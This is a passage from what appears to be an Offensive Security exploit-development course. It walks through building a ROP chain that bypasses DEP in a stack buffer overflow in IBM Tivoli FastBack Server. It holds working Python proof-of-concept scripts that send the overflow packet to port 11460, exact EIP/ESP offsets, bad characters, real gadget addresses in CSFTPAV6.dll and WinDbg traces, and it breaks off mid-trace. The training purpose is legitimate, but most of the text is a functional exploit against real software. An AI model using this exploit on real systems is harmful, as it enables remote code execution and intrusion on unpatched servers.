C:\Tools\dep> copy "C:\Program Files\Tivoli\TSM\FastBack\server\FastBackServer.exe" . 
        1 file(s) copied. 
         
C:\Tools\dep> rp-win-x86.exe -f FastBackServer.exe -r 5 > rop.txt 
Listing 460 - Running rp++ on FastBackServer.exe 
In Listing 460, we picked a maximum gadget length of 5. Anything longer typically contains 
instructions that might be problematic during the execution of our ROP chain. We also redirected 
the output to a file, since it’s written to the console by default. 
 
338 (Axel Souchet, 2017), https://github.com/0vercl0k/rp 
339 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Executable_and_Linkable_Format 
340 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Mach-O 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
389 
Once the execution completes, we can open the output file and inspect the syntax of the located 
gadgets. 
Trying to open 'FastBackServer.exe'.. 
Loading PE information.. 
FileFormat: PE, Arch: Ia32 
Using the Nasm syntax.. 
 
Wait a few seconds, rp++ is looking for gadgets.. 
in .text 
211283 found. 
 
A total of 211283 gadgets found. 
0x00547b94: aaa  ; adc dword [eax], eax ; add esp, 0x08 ; mov ecx, dword [ebp-
0x00000328] ; mov dword [ecx+0x00000208], 0x00000C04 ; call dword [0x0067E494] ;  (1 
found) 
0x00569725: aaa  ; add byte [eax], al ; add byte [ebx+0x0BC0E8C8], cl ; or eax, 
0x5DE58B00 ; ret  ;  (1 found) 
0x005417b2: aaa  ; add byte [eax], al ; call dword [0x0067E494] ;  (1 found) 
0x00541b78: aaa  ; add byte [eax], al ; call dword [0x0067E494] ;  (1 found) 
0x0054e2e0: aaa  ; add dword [eax], 0x81E8558B ; retn 0x0210 ;  (1 found) 
... 
Listing 461 - Output from rp++ 
As highlighted in Listing 461, each gadget is listed on a separate line. The first column is its 
memory address followed by a “:” and a space, after which we find the first instruction. Additional 
instructions are separated by “;”. 
This syntax makes it possible to search in the text editor or use a command-line tool like 
findstr,341 depending on our preference. 
As an example, in Figure 138, we perform a search for “: pop eax ; ret”. This ensures that the POP 
EAX instruction is first and nothing comes between it and the RET instruction. 
 
Figure 138: Searching for specific gadget 
As noted in the figure above, the result is gadgets that only contain the instructions we want. 
Locating instructions can take a bit of practice, but is well worth the time investment. 
Next, we can continue and attempt to implement the ROP technique to combat DEP. 
 
341 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
390 
9.3.2.1 Exercises 
1. 
Experiment with rp++, generate gadgets for FastBackServer.exe, and notice the time 
difference compared to the execution of our pykd script. 
2. 
Use either the text editor or a command line tool to perform searches in the output file. 
Locate gadgets containing the instruction “ADD EAX, ECX” and a second gadget that 
contains “XCHG EAX, ESP”. Ensure both gadgets do not contain instructions that will disrupt 
the execution flow or cause an access violation. 
9.4 Bypassing DEP 
In this section, we are going to return to a vulnerability in the IBM Tivoli Storage Manager 
FastBack Server component that we discovered through reverse engineering in a previous 
module and create an exploit that uses ROP to bypass DEP. 
As a recap, this vulnerability was found by sending a network packet containing the opcode value 
0x534 to TCP port 11460. This forces the execution of a code path that calls sscanf with a user-
controlled buffer as an argument. 
Setting the File parameter of the format string used in the sscanf call to a very large string causes 
a stack buffer overflow and, in the end, yields control of the EIP register. The proof of concept to 
trigger this vulnerability is shown below.  
import socket 
import sys 
from struct import pack 
 
# psAgentCommand 
buf = bytearray([0x41]*0xC) 
buf += pack("<i", 0x534)  # opcode 
buf += pack("<i", 0x0)    # 1st memcpy: offset 
buf += pack("<i", 0x500)  # 1st memcpy: size field 
buf += pack("<i", 0x0)    # 2nd memcpy: offset 
buf += pack("<i", 0x100)  # 2nd memcpy: size field 
buf += pack("<i", 0x0)    # 3rd memcpy: offset 
buf += pack("<i", 0x100)  # 3rd memcpy: size field 
buf += bytearray([0x41]*0x8) 
 
# psCommandBuffer 
formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % 
(b"A"*0x200,0,0,0,0) 
buf += formatString 
 
# Checksum 
buf = pack(">i", len(buf)-4) + buf 
 
def main(): 
    if len(sys.argv) != 2: 
        print("Usage: %s <ip_address>\n" % (sys.argv[0])) 
        sys.exit(1) 
     
    server = sys.argv[1] 
    port = 11460 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
391 
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.connect((server, port)) 
 
    s.send(buf) 
    s.close() 
 
    print("[+] Packet sent") 
    sys.exit(0) 
 
 
if __name__ == "__main__": 
    main() 
Listing 462 - Initial proof of concept for FastBackServer buffer overflow 
In the following subsections, we are going to cover each stage of the DEP bypass by creating a 
ROP chain that calls the Windows VirtualAlloc API. 
9.4.1 Getting The Offset 
The first thing we need to do is locate the offset of the DWORD inside our input buffer that is 
loaded into EIP, just like with any other stack buffer overflow exploit. We need to do similar work 
for ESP as well. 
We are going to use the Metasploit pattern_create and pattern_offset scripts to locate the 
offset. First, we generate the 0x200 byte length pattern string: 
kali@kali:~$ msf-pattern_create -l 0x200 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac... 
Listing 463 - Creating a pattern of length 0x200 
We’ll update the proof of concept, as shown in Listing 464 to embed the unique string instead of 
the 0x200 A’s.  
import socket 
import sys 
from struct import pack 
 
# psAgentCommand 
buf = bytearray([0x41]*0xC) 
buf += pack("<i", 0x534)  # opcode 
buf += pack("<i", 0x0)    # 1st memcpy: offset 
buf += pack("<i", 0x500)  # 1st memcpy: size field 
buf += pack("<i", 0x0)    # 2nd memcpy: offset 
buf += pack("<i", 0x100)  # 2nd memcpy: size field 
buf += pack("<i", 0x0)    # 3rd memcpy: offset 
buf += pack("<i", 0x100)  # 3rd memcpy: size field 
buf += bytearray([0x41]*0x8) 
 
# psCommandBuffer 
pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac... 
 
formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % 
(pattern,0,0,0,0) 
buf += formatString 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
392 
 
# Checksum 
buf = pack(">i", len(buf)-4) + buf 
... 
Listing 464 - Updated proof of concept with unique pattern 
Next, we execute the updated proof of concept and observe the access violation as shown in 
Listing 465. 
(830.b2c): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=00000000 ebx=0605ad40 ecx=0d8aca70 edx=77071670 esi=0605ad40 edi=00669360 
eip=41326a41 esp=0d8ae31c ebp=316a4130 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 
41326a41 ??              ??? 
Listing 465 - Access violation when sending unique string 
EIP contains the value “41326a41”, so we use msf-pattern_offset to determine the offset: 
kali@kali:~$ msf-pattern_offset -q 41326a41 
[*] Exact match at offset 276 
Listing 466 - Offset for EIP 
This shows us that the offset is 276. Similarly, we can dump the first DWORD ESP points to, and 
use msf-pattern_offset to find the offset of 280. This means that ESP points right after the 
return address and we do not need additional padding space between the return address and our 
payload. 
Now, we can update the proof of concept to take the offsets into account as shown in Listing 
467.  
import socket 
import sys 
from struct import pack 
 
# psAgentCommand 
buf = bytearray([0x41]*0xC) 
buf += pack("<i", 0x534)  # opcode 
buf += pack("<i", 0x0)    # 1st memcpy: offset 
buf += pack("<i", 0x500)  # 1st memcpy: size field 
buf += pack("<i", 0x0)    # 2nd memcpy: offset 
buf += pack("<i", 0x100)  # 2nd memcpy: size field 
buf += pack("<i", 0x0)    # 3rd memcpy: offset 
buf += pack("<i", 0x100)  # 3rd memcpy: size field 
buf += bytearray([0x41]*0x8) 
 
# psCommandBuffer 
offset = b"A" * 276 
eip = b"B" * 4 
rop = b"C" * (0x400 - 276 - 4) 
 
formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % 
(offset+eip+rop,0,0,0,0) 
buf += formatString 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
393 
 
# Checksum 
buf = pack(">i", len(buf)-4) + buf 
... 
Listing 467 - Updated proof of concept with offsets for EIP and ESP 
In addition to detecting the offsets, we also need to check for bad characters by reusing a 
previously described technique. Specifically, we can put all hexadecimal values between 0x00 and 
0xFF in our overflow buffer and check which ones might interfere with our exploit. 
The bytes shown in Listing 468 represent all of the bad characters we would find.  
0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20 
Listing 468 - Bad characters 
For an exploit that uses ROP gadgets, it’s important that the addresses of the gadgets do not 
contain any of the bad characters. As we will discover in the next section, we have to choose the 
module for our gadgets carefully. 
9.4.1.1 Exercises 
1. 
Repeat the steps to locate the offsets for EIP and ESP. 
2. 
Update your proof of concept to align the offset as shown in Listing 467. 
3. 
Verify the set of bad characters. 
9.4.2 Locating Gadgets 
With our newly acquired ability to locate gadgets, let’s turn our attention to determining which 
module to use. Up until now, we have focused on FastBackServer.exe, but since the vulnerability 
we found in the last module is due to unsanitized input to a sscanf call, this will prove to be a 
problem. Let’s find out why. 
First, we will use the lm command in WinDbg to dump the base and end address of 
FastBackServer: 
0:077> lm m FastBackServer 
Browse full module list 
start    end        module name 
00400000 00c0c000   FastBackServer   (deferred)  
Listing 469 - Start and end address of FastBackServer 
As shown in Listing 469, we find the uppermost byte is always 0x00. 
Since the sscanf API accepts a null-terminated string as the first argument, and that is the buffer 
that ends up overflowing the stack buffer, our ROP chain cannot contain any NULL bytes or other 
bad characters. This implies that the gadgets cannot come from FastBackServer.exe. 
We need to find a different module that does not contain a null byte in the uppermost byte and 
one that is preferably part of the application. If we choose a module that is not part of the 
application, then the address of gadgets will vary depending on the patch level of the operating 
system. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
394 
 
Native Windows modules often have additional protections enabled, which will 
require an even more advanced approach, as we shall find in a future module. 
By observing the base and end addresses of all modules bundled with FastBackServer, we find 
multiple options. One such module is CSFTPAV6.dll as shown in Listing 470: 
0:077> lm m CSFTPAV6 
Browse full module list 
start    end        module name 
50500000 50577000   CSFTPAV6   (deferred)  
Listing 470 - Start and end address of CSFTPAV6 
Let’s copy CSFTPAV6.dll to the C:\Tools\dep folder where we can use rp++ to generate gadgets, 
as shown in Listing 471. 
C:\Tools\dep> copy "C:\Program Files\Tivoli\TSM\FastBack\server\csftpav6.dll" . 
        1 file(s) copied. 
 
C:\Tools\dep> rp-win-x86.exe -f csftpav6.dll -r 5 > rop.txt 
Listing 471 - Generating a list of gadgets from csftpav6.dll 
If we open the generated file, we will notice that all the gadgets have an address starting with 
0x50, proving that we avoided the upper null byte. Now we are finally able to start building the 
ROP chain itself. 
9.4.2.1 Exercise 
1. 
Locate ROP gadgets in csftpav6.dll for later use. 
9.4.3 Preparing the Battlefield 
To start building our ROP chain, let’s begin by showing how to use VirtualAlloc to bypass DEP. 
VirtualAlloc can reserve, commit, or change the state of a region of pages in the virtual address 
space of the calling process. 
The first thing we need to know about VirtualAlloc is its function prototype. This is documented by 
Microsoft, as shown in Listing 472. 
 LPVOID WINAPI VirtualAlloc( 
   _In_opt_ LPVOID lpAddress, 
   _In_     SIZE_T dwSize, 
   _In_     DWORD  flAllocationType, 
   _In_     DWORD  flProtect 
 ); 
Listing 472 - VirtualAlloc function prototype 
Before our ROP chain invokes VirtualAlloc, we need to make sure that all four parameters have 
been set up correctly. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
395 
If the lpAddress parameter points to an address belonging to a previously committed memory 
page, we will be able to change the protection settings for that memory page using the flProtect 
parameter. 
This use of VirtualAlloc allows us to achieve the same goal we’d accomplish 
through the use of VirtualProtect. 
As shown in the function prototype, VirtualAlloc requires a parameter (dwSize) for the size of the 
memory region whose protection properties we are trying to change. However, VirtualAlloc can 
only change the memory protections on a per-page basis, so as long as our shellcode is less than 
0x1000 bytes, we can use any value between 0x01 and 0x1000. 
The two final arguments are predefined enums. flAllocationType must be set to the 
MEM_COMMIT enum value (numerical value 0x00001000), while flProtect should be set to the 
PAGE_EXECUTE_READWRITE enum value (numerical value 0x00000040).342 This will allow the 
memory page to be readable, writable, and executable. 
We are going to invoke VirtualAlloc by placing a skeleton of the function call on the stack through 
the buffer overflow, modifying its address and parameters through ROP, and then return into it. 
The skeleton should contain the VirtualAlloc address followed by the return address (which 
should be our shellcode) and the arguments for the function call. 
Listing 473 shows an example of the required values for invoking VirtualAlloc with a fictitious 
stack address of 0x0d2be300 and a fictitious address for VirtualAlloc. 
0d2be300 75f5ab90 -> KERNEL32!VirtualAllocStub 
0d2be304 0d2be488 -> Return address (Shellcode on the stack) 
0d2be308 0d2be488 -> lpAddress (Shellcode on the stack) 
0d2be30c 00000001 -> dwSize 
0d2be310 00001000 -> flAllocationType 
0d2be314 00000040 -> flProtect 
Listing 473 - A VirtualAlloc skeleton example 
Note the name VirtualAllocStub, instead of VirtualAlloc listed above. The official 
API name is VirtualAlloc, but the symbol name for it, inside kernel32.dll, is 
VirtualAllocStub. 
There are a few things to note from the example above. 
1. 
We do not know the VirtualAlloc address beforehand. 
2. 
We do not know the return address and the lpAddress argument beforehand. 
3. 
dwSize, flAllocationType, and flProtect contain NULL bytes. 
 
342 (Microsoft, 2018), https://msdn.microsoft.com/en-us/library/windows/desktop/aa366786(v=vs.85).aspx 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
396 
We can deal with these problems by sending placeholder values in the skeleton. We’ll then 
assemble ROP gadgets that will dynamically fix the dummy values, replacing them with the 
correct ones. 
Let’s update our proof of concept (Listing 474), and insert the dummy values as the last part of 
the offset values preceding EIP. They will be placed on the stack just before the return address 
and the ROP chain.  
import socket 
import sys 
from struct import pack 
 
# psAgentCommand 
buf = bytearray([0x41]*0xC) 
buf += pack("<i", 0x534)  # opcode 
buf += pack("<i", 0x0)    # 1st memcpy: offset 
buf += pack("<i", 0x500)  # 1st memcpy: size field 
buf += pack("<i", 0x0)    # 2nd memcpy: offset 
buf += pack("<i", 0x100)  # 2nd memcpy: size field 
buf += pack("<i", 0x0)    # 3rd memcpy: offset 
buf += pack("<i", 0x100)  # 3rd memcpy: size field 
buf += bytearray([0x41]*0x8) 
 
# psCommandBuffer 
va  = pack("<L", (0x45454545)) # dummy VirutalAlloc Address 
va += pack("<L", (0x46464646)) # Shellcode Return Address 
va += pack("<L", (0x47474747)) # # dummy Shellcode Address 
va += pack("<L", (0x48484848)) # dummy dwSize  
va += pack("<L", (0x49494949)) # # dummy flAllocationType  
va += pack("<L", (0x51515151)) # dummy flProtect  
 
offset = b"A" * (276 - len(va)) 
eip = b"B" * 4 
rop = b"C" * (0x400 - 276 - 4) 
 
formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % 
(offset+va+eip+rop,0,0,0,0) 
buf += formatString 
 
# Checksum 
buf = pack(">i", len(buf)-4) + buf 
... 
Listing 474 - Updated proof of concept with dummy values 
Once the proof of concept is executed, the network packet will trigger the buffer overflow and 
position the dummy values exactly before the 0x42424242 DWORD that overwrites EIP. We can 
verify this by restarting FastBackServer and attaching WinDbg. 
(7b4.88c): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=00000000 ebx=05e8c638 ecx=0d39ca70 edx=77071670 esi=05e8c638 edi=00669360 
eip=42424242 esp=0d39e31c ebp=51515151 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 
42424242 ??              ??? 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
397 
 
0:006> dd esp - 1C 
0d39e300  45454545 46464646 00000000 48484848 
0d39e310  00000000 51515151 42424242 43434343 
0d39e320  43434343 43434343 43434343 43434343 
0d39e330  43434343 43434343 43434343 43434343 
0d39e340  43434343 43434343 43434343 43434343 
0d39e350  43434343 43434343 43434343 43434343 
0d39e360  43434343 43434343 43434343 43434343 
0d39e370  43434343 43434343 43434343 43434343 
Listing 475 - Stack layout after triggering buffer overflow 
The location of the ROP skeleton is correct, but the DWORDs containing 0x47474747 and 
0x49494949 were overwritten with null bytes as part of the process to trigger the vulnerability. 
This won’t impact us since we’re going to overwrite them again with ROP. In the next section, we 
will take the first step in replacing the dummy values with real values. 
9.4.3.1 Exercises 
1. 
Update your proof of concept to include the dummy values for a call to VirtualAlloc. 
2. 
Execute the proof of concept and ensure all values line up correctly on the stack. 
9.4.4 Making ROP’s Acquaintance 
We have to replace six dummy values on the stack before we can invoke VirtualAlloc, so the first 
step is to gather the stack address of the first dummy value using ROP gadgets. 
The easiest way of obtaining a stack address close to the dummy values is to use the value in 
ESP at the time of the access violation. We cannot modify the ESP register, since it must always 
point to the next gadget for ROP to function. Instead, we will copy it into a different register. 
We’ll have to be creative to get a copy of the ESP register. A gadget like “MOV EAX, ESP ; RET” 
would be ideal, but they typically do not exist as natural opcodes. In this case, we do some 
searching and find the following gadget. 
0x50501110: push esp ; push eax ; pop edi ; pop esi ; ret 
Listing 476 - Gadget that copies the content of ESP into ESI 
Let’s examine exactly what this gadget does. First, it will push the content of ESP to the top of the 
stack. Next, the content of EAX is pushed to the top of the stack, thus moving the value pushed 
from ESP four bytes farther down the stack. 
Next, the POP EDI instruction will pop the value from EAX into EDI and increase the stack pointer 
by four, effectively making it point to the value originally contained in ESP. Finally, the POP ESI will 
pop the value from ESP into ESI, performing the copy of the address we need. 
The return instruction will force execution to transfer to the next DWORD on the stack. Since this 
value is controlled by us through the buffer overflow, we can continue execution with additional 
gadgets. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
398 
 
When learning about ROP for the first time, it is very important to see it in action 
to get a better understanding of how it all ties together. 
We’ll update the proof of concept by replacing the value in the eip variable to be the address of the 
gadget we found, as shown in Listing 477.  
... 
# psCommandBuffer 
va  = pack("<L", (0x45454545)) # dummy VirutalAlloc Address 
va += pack("<L", (0x46464646)) # Shellcode Return Address 
va += pack("<L", (0x47474747)) # dummy Shellcode Address 
va += pack("<L", (0x48484848)) # dummy dwSize  
va += pack("<L", (0x49494949)) # dummy flAllocationType  
va += pack("<L", (0x51515151)) # dummy flProtect  
 
offset = b"A" * (276 - len(va)) 
eip = pack("<L", (0x50501110)) # push esp ; push eax ; pop edi; pop esi ; ret 
rop = b"C" * (0x400 - 276 - 4) 
 
formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % 
(offset+va+eip+rop,0,0,0,0) 
buf += formatString 
 
# Checksum 
buf = pack(">i", len(buf)-4) + buf 
... 
Listing 477 - Proof of concept with first gadget address 
With the exploit code updated, we restart FastBackServer and attach WinDbg. Before allowing 
execution to continue, we need to set a breakpoint on the address of the gadget to follow the 
execution flow, as shown in Listing 478. 
0:080> bp 0x50501110 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program 
Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL -  
0:080> g 
Breakpoint 0 hit 
eax=00000000 ebx=061baba8 ecx=0d5fca70 edx=77071670 esi=061baba8 edi=00669360 
eip=50501110 esp=0d5fe31c ebp=51515151 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
CSFTPAV6+0x1110: 
50501110 54              push    esp 
 
0:080> p 
eax=00000000 ebx=061baba8 ecx=0d5fca70 edx=77071670 esi=061baba8 edi=00669360 
eip=50501111 esp=0d5fe318 ebp=51515151 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
CSFTPAV6+0x1111: 
50501111 50              push    eax 
 
0:080> dd esp L1 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
399 
0d5fe318  0d5fe31c 
 
0:080> p 
eax=00000000 ebx=061baba8 ecx=0d5fca70 edx=77071670 esi=061baba8 edi=00669360 
eip=50501112 esp=0d5fe314 ebp=51515151 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
CSFTPAV6+0x1112: 
50501112 5f              pop     edi 
 
0:080> dd esp L2 
0d5fe314  00000000 0d5fe31c 
 
0:080> p 
eax=00000000 ebx=061baba8 ecx=0d5fca70 edx=77071670 esi=061baba8 edi=00000000 
eip=50501113 esp=0d5fe318 ebp=51515151 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
CSFTPAV6+0x1113: 
50501113 5e              pop     esi 
 
0:080> dd esp L1 
0d5fe318  0d5fe31c 
 
0:080> p 
eax=00000000 ebx=061baba8 ecx=0d5fca70 edx=77071670 esi=0d5fe31c edi=00000000 
eip=50501114 esp=0d5fe31c ebp=51515151 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
CSFTPAV6+0x1114: 
50501114 c3              ret 
 
0:080> dd esp L1 
0d5fe31c  43434343 
Listing 478 - Setting a breakpoint on push esp gadget 
We hit the breakpoint, and then, when we single-step through the first four instructions, the value 
in ESP is pushed to the stack and subsequently popped into ESI, as expected. 
Additionally, when we reach the return instruction, the uppermost DWORD on the stack is the first 
of our 0x43434343 values. This will allow us to continue using more gadgets, linking them 
together in a ROP chain. 
At this point, we have found, implemented, and executed our very first ROP gadget. We are well on 
the way to creating an exploit that will bypass DEP. It is critical to have a firm understanding of 
the concept of ROP, so this section should be reviewed until the concepts are well-understood 
before moving forward. 
9.4.4.1 Exercises 
1. 
Locate the gadget used in this section inside the output generated by rp++. 
2. 
Update the proof of concept to include the gadget instead of the dummy 0x42424242 value 
in EIP. 
3. 
Step through the gadget and ensure a copy of ESP ends up in ESI and execution is ready to 
continue with the next gadget. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
400 
4. 
Use the output file generated by rp++ and attempt to locate an alternative gadget that will 
yield a copy of ESP in a register. 
9.4.5 Obtaining VirtualAlloc Address 
We previously determined that we must get the address of VirtualAlloc while the exploit is 
running. One possible way to do that is to gather its address from the Import Address Table (IAT) 
of the CSFTPAV6 module. 
The IAT is a special table containing the addresses of all APIs that are imported by a module. It is 
populated when the DLL is loaded into the process. We cannot influence which APIs the target 
process imports, but we can locate and use the existing ones. 
With the help of IDA Pro, we can verify that VirtualAlloc is a function imported from CSFTPAV6.dll 
by checking the Imports tab as shown below: 
 
Figure 139: Grabbing VirtualAlloc address from the IAT 
The address of VirtualAlloc will change on reboot, but the address (0x5054A220) of the IAT entry 
that contains it does not change. This means that we can use the IAT entry along with a memory 
dereference to fetch the address of VirtualAlloc at runtime. We’ll do this as part of our ROP chain. 
With a way to resolve the address of VirtualAlloc, we must understand how to use it. In the 
previous step, we placed a dummy value (0x45454545) on the stack for this API address as part 
of our buffer overflow, which we need to overwrite. 
To do this overwrite, we will need to perform three tasks with our ROP gadgets. First, locate the 
address on the stack where the dummy DWORD is. Second, we need to resolve the address of 
VirtualAlloc. Finally, we need to write that value on top of the placeholder value. 
We are going to need multiple gadgets for each of these tasks. Let’s solve each one of them in 
order. 
For the first part, Listing 479 illustrates what the stack layout is like when the buffer overflow 
occurs. 
(7b4.88c): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=00000000 ebx=05e8c638 ecx=0d39ca70 edx=77071670 esi=05e8c638 edi=00669360 
eip=42424242 esp=0d39e31c ebp=51515151 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 
42424242 ??              ??? 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
401 
0:006> dd esp - 1C 
0d39e300  45454545 46464646 00000000 48484848 
0d39e310  00000000 51515151 42424242 43434343 
0d39e320  43434343 43434343 43434343 43434343 
0d39e330  43434343 43434343 43434343 43434343 
0d39e340  43434343 43434343 43434343 43434343 
0d39e350  43434343 43434343 43434343 43434343 
0d39e360  43434343 43434343 43434343 43434343 
0d39e370  43434343 43434343 43434343 43434343 
Listing 479 - Stack layout when triggering buffer overflow 
The dummy value 0x45454545, which represents the location of the VirtualAlloc address, is at a 
negative offset of 0x1C from ESP. 
Ideally, since we have a copy of the ESP value in ESI, we would like to locate a gadget similar to 
the following. 
SUB ESI, 0x1C 
RETN 
Listing 480 - Ideal gadget to obtain VirtualAlloc stack absolute address 
Sadly, we couldn’t find this gadget or a similar one in CSFTPAV6. We’ll need to be a bit more 
creative. 
We could put the 0x1C value on the stack as part of our overflowing buffer and then pop that 
value into another register of our choice using a gadget. This would allow us to subtract the two 
registers and get the desired address. 
The problem with this approach is that the 0x1C value is really 0x0000001C, which has NULL 
bytes in it. 
We can get around the problem by adding -0x1C rather than subtracting 0x1C. The reason this 
works is because the CPU represents -0x1C as a very large value, as shown in Listing 481. 
0:078> ? -0x1c 
Evaluate expression: -28 = ffffffe4 
Listing 481 - Negative 0x1c does not contain NULL bytes 
Now the first part of our game plan is clear. We must put the negative value on the stack, pop it 
into a register, and then add it to the stack pointer address we stored in ESI. 
When using gadgets to perform arithmetic with registers, it is easier to use the EAX and ECX 
registers than to use ESI. This is due to the number of gadgets available and the usage of the 
registers in compiled code. 
The idea is to have a gadget put a copy of ESI into EAX, then pop the negative value into ECX from 
the stack. Next, we add ECX to EAX, and finally, copy EAX back into ESI. 
Knowing which gadgets to search for and how they can go together is a matter 
of trial and error combined with experience. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
402 
To obtain a copy of ESI in EAX, we can use the gadget “MOV EAX,ESI ; POP ESI; RETN”, which 
does a move operation. Additionally, we can update the rop variable in the proof of concept as 
shown in Listing 482, so we can put it in action.  
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn 
rop += pack("<L", (0x42424242)) # junk 
rop += b"C" * (0x400 - 276 - 4 - len(rop)) 
Listing 482 - Gadget to move ESI into EAX 
Notice that the gadget contains a POP ESI instruction. This requires us to add a dummy DWORD 
on the stack for alignment. 
To observe the execution of the new gadget, we restart FastBackServer, set a breakpoint on the 
gadget that copies ESP into ESI, and send the packet: 
0:058> bp 0x50501110 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program 
Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL -  
0:058> g 
ModLoad: 64640000 6464f000   C:\Windows\SYSTEM32\browcli.dll 
Breakpoint 0 hit 
eax=00000000 ebx=05ebb868 ecx=0d2cca70 edx=77071670 esi=05ebb868 edi=00669360 
eip=50501110 esp=0d2ce31c ebp=51515151 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
CSFTPAV6+0x1110: 
50501110 54              push    esp 
 
0:001> pt 
eax=00000000 ebx=05ebb868 ecx=0d2cca70 edx=77071670 esi=0d2ce31c edi=00000000 
eip=50501114 esp=0d2ce31c ebp=51515151 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
CSFTPAV6+0x1114: 
50501114 c3              ret 
 
0:001> p 
eax=00000000 ebx=05ebb868 ecx=0d2cca70 edx=77071670 esi=0d2ce31c edi=00000000 
eip=5050118e esp=0d2ce320 ebp=51515151 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
CSFTPAV6+0x118e: 
5050118e 8bc6            mov     eax,esi 
 
0:001> p 
eax=0d2ce31c ebx=05ebb868 ecx=0d2cca70 edx=77071670 esi=0d2ce31c edi=00000000 
eip=50501190 esp=0d2ce320 ebp=51515151 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
CSFTPAV6+0x1190: 
50501190 5e              pop     esi 
 
0:001> p 
eax=0d2ce31c ebx=05ebb868 ecx=0d2cca70 edx=77071670 esi=42424242 edi=00000000 
eip=50501191 esp=0d2ce324 ebp=51515151 iopl=0         nv up ei pl zr na pe nc 
